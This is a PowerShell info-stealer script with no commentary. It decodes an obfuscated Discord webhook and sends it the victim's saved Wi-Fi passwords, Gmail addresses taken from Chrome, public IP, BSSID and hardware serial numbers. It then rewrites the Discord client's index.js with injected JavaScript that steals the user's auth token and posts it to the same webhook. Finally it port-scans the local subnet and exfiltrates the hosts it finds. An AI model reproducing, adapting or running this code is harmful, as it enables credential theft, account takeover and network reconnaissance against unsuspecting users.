if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }

$b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjU1MjgxMzQ1MDg4NzMzOC83SURPTmdpZUJUZ2dSbUU4TWJtTXJBT1dwM3cxcEdJZ1NleVFjWl90UUlSOFJaeUdMUGNxX3FCc0N4aWtzZUlPOUlSMA=="
$w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ports = @(21,22,23,2323,53,81,80,135,139,443,445,3306,3389,5555,8080,8000,8083,8123)

$ipP = try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'}
$bssid = try{((netsh wlan show int|sls BSSID).ToString().Split(':')[1..6]-join':').Trim()}catch{'N/A'}
$h = (GWMI Win32_Processor).Name
$r = [math]::round((GWMI Win32_PhysicalMemory|Measure Capacity -Sum).Sum/1GB,0)
$s = (GWMI Win32_Bios).SerialNumber

$found_emails = @()
$cp = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
if(Test-Path $cp){ $found_emails = [regex]::Matches((GC $cp -Raw),'[\w\.-]+@gmail\.com') | %{$_.Value} | select -Unique }

$wifi_list = @()
$pr = (netsh wlan show prof | sls '\:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()})
foreach($n in $pr){
    $v = netsh wlan show prof name="$n" key=clear | sls 'Key Content|Contenido'
    if($v){ $wifi_list += "SSID: $n | Pass: $($v.ToString().Split(':')[1].Trim())" }
}

$reportData = [ordered]@{
    "REPORTE"  = "$env:COMPUTERNAME ($env:USERNAME)"
    "IP_PUB"   = $ipP
    "BSSID"    = $bssid
    "Hardware" = @{ "CPU" = $h; "RAM" = "${r}GB"; "SN" = $s }
    "Accounts" = $found_emails
    "WiFi"     = $wifi_list
}
$msgPayload = @{ content = '```json' + "`n" + ($reportData | ConvertTo-Json -Depth 5) + "`n" + '```' } | ConvertTo-Json
try { Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($msgPayload)) -ContentType 'application/json' } catch {}

Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue
$f = (Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1)
if($f){
    $index_content = 'const {app,net}=require("electron"),U="'+$w+'";let l=null;app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`(function(){const f=()=>{try{let t;window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(let m in r.c){if(r.c[m].exports&&r.c[m].exports.default&&r.c[m].exports.default.getToken){let v=r.c[m].exports.default.getToken();if(typeof v==="string")t=v}}}]);if(t){fetch("https://discord.com/api/v9/users/@me",{headers:{"Authorization":t}}).then(r=>r.json()).then(u=>{console.log("V:"+(u.username||u.global_name)+" I:"+t)})}}catch(e){}};setInterval(f,3000)})()`)}) ;w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("V:")){const d=m.split("V:")[1];if(d!==l){l=d;const p=d.split(" I:");const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**User:** `"+p[0]+"`\n**Token:**\n```"+p[1]+"```"}));r.end()}}})});module.exports=require("./core.asar");'
    [System.IO.File]::WriteAllText($f, $index_content)
    Start-Process "$env:LOCALAPPDATA\Discord\Update.exe" "-processStart Discord.exe"
}

$activeRoute = Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Sort-Object RouteMetric | Select-Object -First 1
if ($activeRoute) {
    $localIP = (Get-NetIPAddress -InterfaceIndex $activeRoute.InterfaceIndex -AddressFamily IPv4).IPAddress | Select-Object -First 1
}

if (!$localIP) {
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
        $_.InterfaceAlias -match "Wi-Fi|Wireless|Ethernet" -and 
        $_.InterfaceAlias -notmatch "vEthernet|VMware|Loopback|Docker|VirtualBox" -and
        $_.IPAddress -notlike "169.254.*"
    }).IPAddress | Select-Object -First 1
}

if ($localIP) {
    $base = $localIP -replace '\.\d+$', ''
    $pool = [runspacefactory]::CreateRunspacePool(1, 60); $pool.Open()
    $jobs = New-Object System.Collections.Generic.List[object]; $netResults = New-Object System.Collections.Generic.List[string]

    $sb = { param($ip, $p)
        $foundPorts = foreach($port in $p){
            $t = New-Object Net.Sockets.TcpClient
            if($t.BeginConnect($ip,$port,$null,$null).AsyncWaitHandle.WaitOne(200)){ if($t.Connected){$port} }
            $t.Close(); $t.Dispose()
        }
        if($foundPorts){ "$ip (Ports: $($foundPorts -join ','))" }
    }

    for($i=1; $i -lt 255; $i++){
        $ps = [powershell]::Create().AddScript($sb).AddArgument("$base.$i").AddArgument($ports)
        $ps.RunspacePool = $pool; $jobs.Add(@{R=$ps; H=$ps.BeginInvoke()})
    }

    while($jobs.Count -gt 0){
        $done = $jobs | ?{$_.H.IsCompleted}
        foreach($item in $done){
            $res = $item.R.EndInvoke($item.H); if($res){ $netResults.Add($res) }
            $item.R.Dispose(); $jobs.Remove($item) | Out-Null
        }
        Start-Sleep -Milliseconds 50
    }

    if($netResults.Count -gt 0){
        $netJson = @{ "NETWORK_SCAN" = $netResults } | ConvertTo-Json
        $msgNet = @{ content = '```json' + "`n" + $netJson + "`n" + '```' } | ConvertTo-Json
        try { Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($msgNet)) -ContentType 'application/json' } catch {}
    }
    $pool.Close()
}


